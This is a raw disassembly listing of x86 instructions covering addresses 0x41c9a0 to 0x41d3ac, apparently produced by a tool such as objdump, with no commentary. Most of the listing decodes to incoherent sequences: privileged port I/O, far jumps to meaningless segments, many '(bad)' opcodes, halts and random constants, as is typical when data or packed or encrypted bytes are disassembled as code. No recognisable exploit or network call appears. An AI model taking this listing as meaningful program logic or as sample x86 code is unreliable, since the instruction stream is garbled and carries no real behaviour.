  41c9a0:	adc    DWORD PTR [esi+0x74],ecx
  41c9a3:	aas    
  41c9a4:	out    0x16,al
  41c9a6:	push   ss
  41c9a7:	push   edi
  41c9a8:	push   ebp
  41c9a9:	sub    DWORD PTR ds:0xaa7251eb,esp
  41c9af:	xchg   edx,eax
  41c9b0:	jmp    0x8484:0xcd6aae32
  41c9b7:	imul   esi,DWORD PTR ds:0xf625c03a,0x528982f6
  41c9c1:	ret    0x83cf
  41c9c4:	adc    bl,cl
  41c9c6:	ret    
  41c9c7:	dec    ebp
  41c9c8:	jge    0x41c9cb
  41c9ca:	cmp    BYTE PTR [ebp+ebp*4-0x6d],0x18
  41c9cf:	and    BYTE PTR [esi-0xfe87767],ch
  41c9d5:	dec    eax
  41c9d6:	add    DWORD PTR [eax],edi
  41c9d8:	xchg   edx,eax
  41c9d9:	pop    ebx
  41c9da:	xor    al,0xd5
  41c9dc:	or     eax,0x42ca55c5
  41c9e1:	sub    eax,0xe688f0ac
  41c9e6:	inc    edi
  41c9e7:	pop    eax
  41c9e8:	cmp    ecx,DWORD PTR [eax]
  41c9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9eb:	popf   
  41c9ec:	fs xchg edx,eax
  41c9ee:	adc    DWORD PTR [ecx-0xb],ebp
  41c9f1:	jge    0x41ca15
  41c9f3:	or     eax,0xa3435c95
  41c9f8:	push   ss
  41c9f9:	mov    eax,ds:0x28cbe56a
  41c9fe:	sub    eax,0xce692c56
  41ca03:	xchg   edx,eax
  41ca04:	in     eax,0x6
  41ca06:	imul   ebx,DWORD PTR [ecx-0x29],0x22
  41ca0a:	xchg   ecx,eax
  41ca0b:	push   ebp
  41ca0c:	stos   DWORD PTR es:[edi],eax
  41ca0d:	pop    es
  41ca0e:	jg     0x41c9a0
  41ca10:	sldt   WORD PTR [eax]
	...
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	repnz test BYTE PTR cs:[ebp+ebp*4+0x30],0x1
  41ca87:	add    BYTE PTR ds:0xa1000001,al
  41ca8d:	dec    edi
  41ca8e:	lds    ebx,FWORD PTR [ebx-0x3a]
  41ca91:	call   ebp
  41ca93:	push   esi
  41ca94:	mov    ds:0x41ac3ee5,al
  41ca99:	push   es
  41ca9a:	or     DWORD PTR [ebp+ebp*1+0x1f],0xe32be8d6
  41caa2:	dec    ebx
  41caa3:	dec    edi
  41caa4:	in     al,dx
  41caa5:	addr16 mov ds:0xfcbb,al
  41caa9:	out    0x92,eax
  41caab:	icebp  
  41caac:	and    dl,BYTE PTR [edx-0x694862c2]
  41cab2:	dec    ebp
  41cab3:	xchg   esi,eax
  41cab4:	adc    BYTE PTR [eax],bh
  41cab6:	ds aaa 
  41cab8:	hlt    
  41cab9:	mov    al,ds:0xc54171a2
  41cabe:	push   0x6a
  41cac0:	ss push cs
  41cac2:	shl    BYTE PTR [esi],1
  41cac4:	outs   dx,DWORD PTR ds:[esi]
  41cac5:	outs   dx,BYTE PTR ds:[esi]
  41cac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cac7:	sub    DWORD PTR [edi],edx
  41cac9:	(bad)  
  41caca:	mov    ebp,0x501a98e4
  41cacf:	sub    eax,0x83fc1bfa
  41cad4:	pop    ecx
  41cad5:	ret    0xac51
  41cad8:	call   0x2f1928ac
  41cadd:	jne    0x41caeb
  41cadf:	pop    edx
  41cae0:	mov    esp,0xff9f4d26
  41cae5:	pop    edx
  41cae6:	or     DWORD PTR [ebp-0x71],ebp
  41cae9:	mov    ah,0x9c
  41caeb:	xchg   esi,eax
  41caec:	dec    ecx
  41caed:	addr16 xchg esi,esi
  41caf0:	gs aaa 
  41caf2:	fcomp  DWORD PTR [eax-0x374dc2fe]
  41caf8:	dec    eax
  41caf9:	and    eax,0x775645f7
  41cafe:	mov    dh,BYTE PTR [edx-0x6c]
  41cb01:	(bad)  [edi-0x3a3a0ca8]
  41cb07:	push   esi
  41cb08:	sub    eax,0x5308df3
  41cb0d:	xor    al,0xbc
  41cb0f:	jg     0x41cad1
  41cb11:	pop    esi
  41cb12:	int    0x17
  41cb14:	test   al,0x72
  41cb16:	hlt    
  41cb17:	mov    ebx,0x3df2fc54
  41cb1c:	mov    eax,ds:0x69c1ad70
  41cb21:	push   ds
  41cb22:	lea    esi,[edx+0x233805ad]
  41cb28:	mov    ebp,DWORD PTR [eax-0x56]
  41cb2b:	push   ebp
  41cb2c:	pop    eax
  41cb2d:	bound  esp,QWORD PTR [eax+eax*2-0x1b96ef4c]
  41cb34:	fmul   DWORD PTR [ebp+0x72372eef]
  41cb3a:	xchg   ecx,eax
  41cb3b:	mov    dl,0x15
  41cb3d:	je     0x41caef
  41cb3f:	jmp    0xe674:0x66401532
  41cb46:	mov    WORD PTR [ebx],es
  41cb48:	or     eax,0xba11a5db
  41cb4d:	ins    DWORD PTR es:[edi],dx
  41cb4e:	pop    edi
  41cb4f:	jo     0x41cbbd
  41cb51:	mov    eax,ds:0xe1c31233
  41cb56:	sub    bh,dl
  41cb58:	pop    edx
  41cb59:	pop    ebp
  41cb5a:	adc    ch,BYTE PTR [esp+esi*1+0xe91d8b3]
  41cb61:	sbb    edx,0x7c
  41cb64:	mov    ds:0xdac3c0d9,al
  41cb69:	xchg   ebp,eax
  41cb6a:	lds    ebx,FWORD PTR [edi+eiz*2-0x5f]
  41cb6e:	jge    0x41cbb4
  41cb70:	add    eax,0x1871fd35
  41cb75:	ds push esi
  41cb77:	ror    BYTE PTR [edx+esi*2+0x710525cc],0x1
  41cb7f:	and    al,0x8c
  41cb81:	sbb    DWORD PTR [edx+0x19],ebx
  41cb84:	xor    esi,eax
  41cb86:	mov    esp,0xf77a993f
  41cb8b:	into   
  41cb8c:	push   edx
  41cb8d:	sar    BYTE PTR [esi],cl
  41cb8f:	push   ds
  41cb90:	stc    
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xe9375b22
  41cc03:	iret   
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0xa4000001
  41cc0d:	mov    ebp,ecx
  41cc0f:	mov    ebx,esi
  41cc11:	add    esi,ebx
  41cc13:	and    eax,0x4e163f6e
  41cc18:	dec    eax
  41cc19:	cmp    dh,0x77
  41cc1c:	add    DWORD PTR [ebx],esp
  41cc1e:	jp     0x41cc34
  41cc20:	jle    0x41cbc5
  41cc22:	or     DWORD PTR [ebx+0x2b],esp
  41cc25:	add    DWORD PTR [ebx-0x7e56ebf3],ebx
  41cc2b:	(bad)
  41cc2f:	add    bh,BYTE PTR [ebp-0x34]
  41cc32:	lods   eax,DWORD PTR ds:[esi]
  41cc33:	stos   BYTE PTR es:[edi],al
  41cc34:	add    BYTE PTR [ecx+eiz*1],ah
  41cc37:	jno    0x41cbeb
  41cc39:	aas    
  41cc3a:	pop    ebp
  41cc3b:	(bad)  
  41cc3c:	nop
  41cc3d:	ds jle 0x41cc7c
  41cc40:	pop    esi
  41cc41:	mov    esp,0x7814e686
  41cc46:	sbb    BYTE PTR [esi+eax*2+0x76],cl
  41cc4a:	push   ds
  41cc4b:	ror    BYTE PTR [ecx+0x6f],1
  41cc4e:	test   BYTE PTR [ebx],cl
  41cc50:	or     BYTE PTR [ebx],ch
  41cc52:	int    0x6e
  41cc54:	mov    BYTE PTR [esp+ecx*8-0x4f5d3a03],ah
  41cc5b:	repz mov bh,0x3e
  41cc5e:	lock jnp 0x41cc81
  41cc61:	cmp    ebx,DWORD PTR [eax+0x4b581f74]
  41cc67:	lock enter 0x887e,0x1c
  41cc6c:	push   ds
  41cc6d:	mov    ecx,0xc00d1dea
  41cc72:	add    eax,DWORD PTR [eax-0xed7afd7]
  41cc78:	cmp    al,dl
  41cc7a:	imul   eax,DWORD PTR [ebx+ebp*2-0x74],0xffffffc7
  41cc7f:	jns    0x41ccb8
  41cc81:	add    bl,dl
  41cc83:	xchg   ebp,eax
  41cc84:	jo     0x41cc9d
  41cc86:	and    DWORD PTR [ebp+0x782fec94],ebx
  41cc8c:	dec    ebx
  41cc8d:	clc    
  41cc8e:	(bad)  
  41cc8f:	sar    BYTE PTR [edi+0x18e031db],1
  41cc95:	sub    esi,DWORD PTR [ecx+0x21]
  41cc98:	mov    dl,0xc3
  41cc9a:	xor    al,0x0
  41cc9c:	jbe    0x41cc45
  41cc9e:	xchg   edi,eax
  41cc9f:	loope  0x41ccdc
  41cca1:	popa   
  41cca2:	jge    0x41cce7
  41cca4:	call   0xb77b:0xa5dd49f0
  41ccab:	fisttp QWORD PTR [eax]
  41ccad:	jns    0x41cc6b
  41ccaf:	push   ds
  41ccb0:	push   ebp
  41ccb1:	cli    
  41ccb2:	sbb    al,0xfc
  41ccb4:	mov    dl,0x2c
  41ccb6:	stc    
  41ccb7:	inc    eax
  41ccb8:	push   ss
  41ccb9:	inc    esi
  41ccba:	inc    esp
  41ccbb:	adc    al,0x62
  41ccbd:	pop    ecx
  41ccbe:	mov    ecx,DWORD PTR [eax]
  41ccc0:	and    al,0x5
  41ccc2:	mov    DWORD PTR [edx+0x72e492f],edi
  41ccc8:	je     0x41cc51
  41ccca:	mov    DWORD PTR [esi+0x4275f416],edx
  41ccd0:	adc    al,0xda
  41ccd2:	enter  0x63ca,0x77
  41ccd6:	pop    eax
  41ccd7:	jae    0x41cc8e
  41ccd9:	mov    dh,0x13
  41ccdb:	add    eax,0xeb0c8ab0
  41cce0:	out    0xe9,al
  41cce2:	inc    ecx
  41cce3:	sti    
  41cce4:	sbb    eax,0x5ee65877
  41cce9:	out    dx,eax
  41ccea:	push   edi
  41cceb:	popf   
  41ccec:	popa   
  41cced:	dec    edi
  41ccee:	lahf   
  41ccef:	out    dx,al
  41ccf0:	push   edx
  41ccf1:	dec    esi
  41ccf2:	ins    DWORD PTR es:[edi],dx
  41ccf3:	jnp    0x41cc8a
  41ccf5:	out    dx,eax
  41ccf6:	(bad)  
  41ccf7:	cwde   
  41ccf8:	push   edx
  41ccf9:	mov    ebp,0xf75eaa11
  41ccfe:	inc    edi
  41ccff:	xor    esp,DWORD PTR [ebp+0x426ee88d]
  41cd05:	mov    edi,0x4aceddf9
  41cd0a:	mul    al
  41cd0c:	and    BYTE PTR [esi],0xe0
  41cd0f:	test   ch,0x0
	...
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	pop    eax
  41cd81:	mov    esi,0x32b77b80
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x54000001
  41cd8d:	mov    ebx,0x39c2965d
  41cd92:	and    eax,0x9637e89
  41cd97:	mov    bl,0x5b
  41cd99:	push   ebx
  41cd9a:	or     cl,BYTE PTR [ebx]
  41cd9c:	push   edi
  41cd9d:	aam    0xb7
  41cd9f:	mov    eax,0x8b60ae6b
  41cda4:	mov    ds,eax
  41cda6:	test   BYTE PTR [eax],bl
  41cda8:	and    DWORD PTR [ecx-0x15],0x9008d0f
  41cdaf:	add    esi,eax
  41cdb1:	fmulp  st(1),st
  41cdb3:	and    ah,BYTE PTR [edi+0xe]
  41cdb6:	mov    ah,dl
  41cdb8:	xchg   esp,eax
  41cdb9:	inc    ebx
  41cdba:	cmp    al,0xde
  41cdbc:	jnp    0x41ce23
  41cdbe:	out    0x75,al
  41cdc0:	out    0x44,al
  41cdc2:	or     eax,DWORD PTR ds:0x68ca0c75
  41cdc8:	nop
  41cdc9:	dec    edi
  41cdca:	js     0x41ce06
  41cdcc:	(bad)  
  41cdcd:	and    dl,BYTE PTR [edi]
  41cdcf:	and    BYTE PTR [edx+0xb69951],cl
  41cdd5:	sub    esi,edx
  41cdd7:	test   eax,0x467963bf
  41cddc:	and    cl,cl
  41cdde:	mov    eax,0x8d2b9d93
  41cde3:	inc    esi
  41cde4:	sub    bh,0xae
  41cde7:	and    DWORD PTR [ebx+0x29ff1b90],esp
  41cded:	arpl   WORD PTR [eax+0x43ecea14],si
  41cdf3:	xor    al,0x94
  41cdf5:	iret   
  41cdf6:	into   
  41cdf7:	sub    al,0x3c
  41cdf9:	rol    BYTE PTR [edi-0x7],0x24
  41cdfd:	ss stos BYTE PTR es:[edi],al
  41cdff:	jecxz  0x41ce5b
  41ce01:	fsubrp st(5),st
  41ce03:	mov    ecx,edi
  41ce05:	push   0x24
  41ce07:	push   esp
  41ce08:	mov    esp,0x5f7b74f1
  41ce0d:	out    dx,eax
  41ce0e:	jbe    0x41cda5
  41ce10:	clc    
  41ce11:	shr    BYTE PTR [ebp+0x18887350],0x9
  41ce18:	and    eax,0x7647247
  41ce1d:	jmp    0xb25e:0x6145e0d
  41ce24:	pop    ebp
  41ce25:	cmp    ecx,eax
  41ce27:	xchg   DWORD PTR [ecx-0x44],eax
  41ce2a:	cwde   
  41ce2b:	ss dec eax
  41ce2d:	push   ebx
  41ce2e:	dec    edx
  41ce2f:	or     DWORD PTR [edi],eax
  41ce31:	loope  0x41cea7
  41ce33:	pop    ebp
  41ce34:	add    al,0x14
  41ce36:	aad    0x18
  41ce38:	fcom   QWORD PTR [edi+0x50]
  41ce3b:	ds jle 0x41ce91
  41ce3e:	push   ss
  41ce3f:	pop    ds
  41ce40:	adc    cl,BYTE PTR [edx-0x45fe2120]
  41ce46:	rol    BYTE PTR [ebp+0x64779bf9],0x68
  41ce4d:	popf   
  41ce4e:	scas   al,BYTE PTR es:[edi]
  41ce4f:	lods   al,BYTE PTR ds:[esi]
  41ce50:	jmp    0x2e8dfdf5
  41ce55:	add    DWORD PTR [ecx],edi
  41ce57:	push   esi
  41ce58:	std    
  41ce59:	dec    esp
  41ce5a:	cmp    esp,edi
  41ce5c:	xor    DWORD PTR [ebx-0x55],edi
  41ce5f:	inc    edi
  41ce60:	and    al,BYTE PTR [edi]
  41ce62:	dec    ebp
  41ce63:	int3   
  41ce64:	pop    edx
  41ce65:	test   dl,al
  41ce67:	(bad)  
  41ce68:	inc    eax
  41ce6a:	leave  
  41ce6b:	(bad)  
  41ce6d:	inc    ecx
  41ce6e:	push   0x50
  41ce70:	cmp    DWORD PTR [ebx+ebp*8],ebp
  41ce73:	nop
  41ce74:	leave  
  41ce75:	mov    ch,0xe
  41ce77:	std    
  41ce78:	scas   eax,DWORD PTR es:[edi]
  41ce79:	cmp    bl,BYTE PTR [edi]
  41ce7b:	push   esp
  41ce7c:	cdq    
  41ce7d:	fs mov edx,0xa4c0b777
  41ce83:	data16 ja 0x41ceec
  41ce86:	in     al,0x66
  41ce88:	add    al,0x83
  41ce8a:	sub    al,0x86
  41ce8c:	repnz lds esp,FWORD PTR [edx+0x5373]
	...
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	aas    
  41cf01:	mov    ebx,0x33bcb9c9
  41cf06:	add    DWORD PTR [eax],eax
  41cf08:	add    eax,0x7a000001
  41cf0d:	mov    ebp,0xfe7d1b1a
  41cf12:	into   
  41cf13:	mov    ch,0x4
  41cf15:	icebp  
  41cf16:	jne    0x41cf5b
  41cf18:	adc    al,0xad
  41cf1a:	jnp    0x41cf6c
  41cf1c:	jno    0x41ceea
  41cf1e:	xor    DWORD PTR [ecx],ecx
  41cf20:	sbb    cl,BYTE PTR [esi]
  41cf22:	or     bh,BYTE PTR [eax-0x7e]
  41cf25:	setnp  ah
  41cf28:	scas   eax,DWORD PTR es:[edi]
  41cf29:	test   esi,ecx
  41cf2b:	cld    
  41cf2c:	jae    0x41ceb3
  41cf2e:	sbb    edx,edi
  41cf30:	gs pop esi
  41cf32:	ret    0xca2a
  41cf35:	and    eax,0x8ddaa8ff
  41cf3a:	xor    BYTE PTR [ecx],cl
  41cf3c:	in     al,dx
  41cf3d:	(bad)  
  41cf3e:	sti    
  41cf3f:	or     eax,0xd3e30194
  41cf44:	pop    ss
  41cf45:	push   edx
  41cf46:	test   eax,0xca259f4f
  41cf4b:	mov    ebx,eax
  41cf4d:	xchg   BYTE PTR [ecx-0x3d6791e7],dh
  41cf53:	je     0x41cf5d
  41cf55:	cmc    
  41cf56:	sub    BYTE PTR [edi+eax*1-0x61],0x32
  41cf5b:	mov    eax,ds:0x1084006b
  41cf60:	xor    DWORD PTR [ebp+0x6d],edx
  41cf63:	cmp    DWORD PTR [edi-0x71],edi
  41cf66:	sub    eax,0x1b0ee366
  41cf6b:	pop    eax
  41cf6c:	dec    ebp
  41cf6d:	stc    
  41cf6e:	leave  
  41cf6f:	jnp    0x41cf7c
  41cf71:	jmp    0xf66b:0xcc341141
  41cf78:	or     eax,0xf6d11593
  41cf7d:	dec    ecx
  41cf7e:	stos   BYTE PTR es:[edi],al
  41cf7f:	shr    BYTE PTR [edx-0x3886d02b],0x94
  41cf86:	out    dx,al
  41cf87:	nop
  41cf88:	xor    BYTE PTR [eax+0x2e],al
  41cf8b:	jbe    0x41cfdd
  41cf8d:	out    dx,al
  41cf8e:	and    bh,BYTE PTR [ebx-0x3e5d0caa]
  41cf94:	idiv   edi
  41cf96:	and    al,0xe1
  41cf98:	fmul   DWORD PTR [eax]
  41cf9a:	sbb    al,0x31
  41cf9c:	loop   0x41d013
  41cf9e:	inc    esp
  41cf9f:	jne    0x41cf72
  41cfa1:	push   DWORD PTR [ebx-0x7c67ff34]
  41cfa7:	data16 jbe 0x41d00a
  41cfaa:	xchg   ebp,eax
  41cfab:	loopne 0x41cfe8
  41cfad:	pop    ebp
  41cfae:	imul   ebp,eax,0xffffffae
  41cfb1:	rcl    DWORD PTR [edx+0x6028984b],0x2d
  41cfb8:	(bad)  
  41cfb9:	mov    ebx,0x3e0d95b2
  41cfbe:	mov    dh,0xf4
  41cfc0:	mov    ecx,0x64a47252
  41cfc5:	jp     0x41cfa6
  41cfc7:	dec    ebp
  41cfc8:	ficomp DWORD PTR [ecx-0x2e]
  41cfcb:	shl    DWORD PTR [ebx-0x5dd8cd8c],cl
  41cfd1:	std    
  41cfd2:	mov    dl,0xe1
  41cfd4:	mov    gs:0x4cfe1e7a,al
  41cfda:	punpckhdq mm0,mm5
  41cfdd:	fnstsw WORD PTR [edx]
  41cfdf:	ret    
  41cfe0:	stos   BYTE PTR es:[edi],al
  41cfe1:	scas   eax,DWORD PTR es:[edi]
  41cfe2:	loopne 0x41d059
  41cfe4:	sbb    ecx,ebx
  41cfe6:	pop    eax
  41cfe7:	mov    ch,BYTE PTR [eax]
  41cfe9:	fadd   st(0),st
  41cfeb:	fisttp WORD PTR [esi-0x47da5a05]
  41cff1:	adc    ebx,DWORD PTR [edx+0xc74be83]
  41cff7:	idiv   BYTE PTR [ecx+edi*8+0x13e0d7b9]
  41cffe:	stos   BYTE PTR es:[edi],al
  41cfff:	push   ecx
  41d000:	shl    BYTE PTR [esi-0x6cc47f32],1
  41d006:	jmp    0xe794ee45
  41d00b:	mov    ah,BYTE PTR [edi]
  41d00d:	xchg   DWORD PTR [ebx],ebx
  41d00f:	jbe    0x41cff5
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x483fc2bd
  41d083:	or     al,cl
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0xdc000001,al
  41d08d:	rol    BYTE PTR [ebx-0x10a56a07],cl
  41d093:	pop    ds
  41d094:	out    0x87,al
  41d096:	mov    ds:0xe28e66ed,eax
  41d09b:	jg     0x41d106
  41d09d:	add    al,0xf4
  41d09f:	xchg   esp,eax
  41d0a0:	stos   DWORD PTR es:[edi],eax
  41d0a1:	adc    BYTE PTR [ecx],ah
  41d0a3:	test   DWORD PTR [eax-0x4d],ecx
  41d0a6:	mov    esi,DWORD PTR [esi]
  41d0a8:	jno    0x41d068
  41d0aa:	and    esi,DWORD PTR [ecx+0x6e676104]
  41d0b0:	cdq    
  41d0b1:	shr    BYTE PTR [edi],1
  41d0b3:	in     al,dx
  41d0b4:	gs ins DWORD PTR es:[edi],dx
  41d0b6:	sub    eax,ecx
  41d0b8:	dec    eax
  41d0b9:	xor    edi,esp
  41d0bb:	jecxz  0x41d093
  41d0bd:	pop    ebp
  41d0be:	rcr    DWORD PTR [esi-0x39],0x39
  41d0c2:	lds    esp,FWORD PTR [edx+0x38]
  41d0c5:	test   DWORD PTR [ecx+0x57181a7b],esi
  41d0cb:	mov    edi,DWORD PTR [ecx-0x1e]
  41d0ce:	shl    esi,0x6a
  41d0d1:	leave  
  41d0d2:	and    dl,BYTE PTR [ecx]
  41d0d4:	push   ds
  41d0d5:	cmp    al,0xd0
  41d0d7:	sbb    al,0xb0
  41d0d9:	jge    0x41d0ca
  41d0db:	js     0x41d0c7
  41d0dd:	cmp    bh,BYTE PTR [ebp+0x3c]
  41d0e0:	xchg   esp,eax
  41d0e1:	jg     0x41d068
  41d0e3:	leave  
  41d0e4:	imul   edi,esp,0x1fd0ffa5
  41d0ea:	xchg   ebp,eax
  41d0eb:	test   eax,0x44a4bc6a
  41d0f0:	dec    esi
  41d0f1:	(bad)  
  41d0f2:	sbb    al,bl
  41d0f4:	cld    
  41d0f5:	fidiv  DWORD PTR [edi]
  41d0f7:	push   0xe6423913
  41d0fc:	jae    0x41d0e6
  41d0fe:	shl    DWORD PTR [esi-0x4a],cl
  41d101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d102:	cmp    bh,ah
  41d104:	mov    dl,0x86
  41d106:	sahf   
  41d107:	outs   dx,DWORD PTR ds:[esi]
  41d108:	(bad)  
  41d109:	inc    ecx
  41d10a:	sbb    eax,0x4af9e31
  41d10f:	aaa    
  41d110:	aas    
  41d111:	jb     0x41d0d1
  41d113:	pop    ecx
  41d114:	popa   
  41d115:	jge    0x41d18f
  41d117:	jecxz  0x41d14f
  41d119:	xor    eax,0x6ece7f4b
  41d11e:	inc    ebp
  41d11f:	mov    ds:0x13703642,eax
  41d124:	push   cs
  41d125:	mov    dh,0x40
  41d127:	sti    
  41d128:	pop    eax
  41d129:	call   0x5e4dbb6f
  41d12e:	add    eax,0x549accd8
  41d133:	mov    ebp,0x20ff0500
  41d138:	icebp  
  41d139:	pop    esp
  41d13a:	xchg   ebp,eax
  41d13b:	pop    ecx
  41d13c:	shl    BYTE PTR [eax],cl
  41d13e:	out    0xb2,al
  41d140:	push   ebp
  41d141:	daa    
  41d142:	mov    esp,0x101255db
  41d147:	jno    0x41d113
  41d149:	mov    al,0x3b
  41d14b:	rcl    BYTE PTR [eax-0x1c119e5a],1
  41d151:	lds    ebx,FWORD PTR [ecx]
  41d153:	hlt    
  41d154:	cwde   
  41d155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d156:	sbb    al,0x77
  41d159:	push   ebx
  41d15a:	ficom  WORD PTR [ebp+0x6a67ca33]
  41d160:	cmp    DWORD PTR [ebp-0x5b],ecx
  41d163:	xchg   esp,eax
  41d164:	add    BYTE PTR [eax+0x5d27a5b9],0xd1
  41d16b:	push   ecx
  41d16c:	pop    ebx
  41d16d:	out    0x70,eax
  41d16f:	or     cl,dh
  41d171:	imul   edi,DWORD PTR [edi+0x71],0x2e84639
  41d178:	das    
  41d179:	sub    ch,al
  41d17b:	inc    edx
  41d17c:	sub    cl,BYTE PTR [ebp+0x39]
  41d17f:	sbb    BYTE PTR [edi+0x41],dh
  41d182:	int3   
  41d183:	sub    esp,DWORD PTR [ecx+0x47]
  41d186:	xor    al,0x49
  41d188:	adc    BYTE PTR [edx],bh
  41d18a:	popf   
  41d18b:	(bad)  
  41d18c:	rcr    bl,0xda
  41d18f:	jle    0x41d134
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	and    eax,0xc6af6710
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	and    eax,0xf140ca7a
  41d211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d212:	dec    esp
  41d213:	add    al,0xd7
  41d215:	mov    BYTE PTR [edi],dh
  41d217:	int    0x37
  41d219:	(bad)  
  41d21a:	xor    eax,ebx
  41d21c:	jne    0x41d272
  41d21e:	mov    DWORD PTR [ecx+0x7e],esp
  41d221:	push   ss
  41d222:	add    al,0x3b
  41d224:	dec    edi
  41d225:	dec    ebp
  41d226:	jno    0x41d269
  41d228:	aaa    
  41d229:	jp     0x41d274
  41d22b:	repz sbb eax,0x270a5802
  41d231:	fnsave [esi+0x4543ce02]
  41d237:	shl    BYTE PTR [ebp+0x5f],0x91
  41d23b:	jb     0x41d1de
  41d23d:	xchg   ebp,eax
  41d23e:	pop    esp
  41d23f:	out    dx,eax
  41d240:	and    eax,edx
  41d242:	jle    0x41d207
  41d244:	dec    edi
  41d245:	jecxz  0x41d27d
  41d247:	imul   ebp,DWORD PTR [eax+0x64],0xffffffdb
  41d24b:	mov    fs,WORD PTR ds:0xf27c7a31
  41d251:	mov    al,ds:0x4d2d0a9e
  41d256:	pop    esp
  41d257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d258:	inc    edx
  41d259:	xchg   esi,eax
  41d25a:	push   eax
  41d25b:	loope  0x41d23c
  41d25d:	popf   
  41d25e:	dec    edi
  41d25f:	cld    
  41d260:	rol    ebx,cl
  41d262:	les    edi,FWORD PTR [esp+eax*4-0x695b8f9e]
  41d269:	sub    al,0x4e
  41d26b:	cmp    al,0x13
  41d26d:	dec    eax
  41d26e:	cli    
  41d26f:	push   0x4a
  41d271:	std    
  41d272:	pushf  
  41d273:	push   esi
  41d274:	mov    ch,0x43
  41d276:	push   ds
  41d277:	into   
  41d278:	mov    ah,0x28
  41d27a:	dec    eax
  41d27b:	mov    ebx,0x226a97e8
  41d280:	jo     0x41d260
  41d282:	sub    dl,BYTE PTR [edi+0x3d]
  41d285:	pop    eax
  41d286:	dec    eax
  41d287:	cwde   
  41d288:	pop    ds
  41d289:	cwde   
  41d28a:	or     al,0xca
  41d28c:	dec    esp
  41d28d:	ss popa 
  41d28f:	xchg   DWORD PTR [esp+ebp*1-0x19],ecx
  41d293:	(bad)  
  41d294:	push   eax
  41d295:	xchg   edi,eax
  41d296:	or     edi,DWORD PTR [eax]
  41d298:	jmp    0x7b95:0xd741181b
  41d29f:	add    DWORD PTR [edi-0x44],esp
  41d2a2:	add    al,0xb6
  41d2a4:	or     ebx,ebp
  41d2a6:	(bad)  
  41d2a7:	or     al,0xf6
  41d2a9:	mov    edi,0xa8bd3f9e
  41d2ae:	lock jl 0x41d2e6
  41d2b1:	cmp    bh,cl
  41d2b3:	call   0xc43a:0x19837d3d
  41d2ba:	mov    bh,0x48
  41d2bc:	loop   0x41d25a
  41d2be:	dec    ebp
  41d2bf:	retf   0xf3d2
  41d2c2:	mov    WORD PTR [ebp-0x19],gs
  41d2c5:	push   esi
  41d2c6:	rol    BYTE PTR [eax+0x5c37359e],1
  41d2cc:	and    DWORD PTR [esp+edi*1-0x20],edi
  41d2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2d1:	xchg   ebp,esp
  41d2d3:	xor    bh,BYTE PTR ss:[esi+ebx*4]
  41d2d7:	sub    DWORD PTR [esi-0x2c],ecx
  41d2da:	mov    BYTE PTR [ecx+0x2c43f760],dh
  41d2e0:	cmc    
  41d2e1:	sahf   
  41d2e2:	cmp    eax,0x7efbc591
  41d2e7:	jl     0x41d351
  41d2e9:	pop    ebp
  41d2ea:	div    dl
  41d2ec:	inc    esi
  41d2ed:	xchg   edi,eax
  41d2ee:	loop   0x41d2b7
  41d2f0:	xchg   BYTE PTR [ecx+0x4a],cl
  41d2f3:	hlt    
  41d2f4:	or     eax,0xd045af55
  41d2f9:	xor    dl,BYTE PTR [ecx+0x6d8cd9bc]
  41d2ff:	mov    bl,0x17
  41d301:	popa   
  41d302:	retf   0x7afa
  41d305:	add    bl,bl
  41d307:	mov    ds:0x9b311a9a,al
  41d30c:	out    dx,eax
  41d30d:	add    eax,0xe5a5f1
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	pop    ss
  41d381:	imul   ecx,ebx,0x52
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0xf000001
  41d38d:	outs   dx,DWORD PTR ds:[esi]
  41d38e:	sub    eax,0x214e6e39
  41d393:	rcl    ah,cl
  41d395:	psllq  mm3,QWORD PTR [ebp-0x46]
  41d399:	sbb    eax,0x2adccf30
  41d39e:	bound  ebp,QWORD PTR [ebx]
  41d3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3a1:	mov    eax,ds:0xfc667f54
  41d3a6:	xor    cl,BYTE PTR [ebp-0x4cd77e44]
  41d3ac:	push   edi
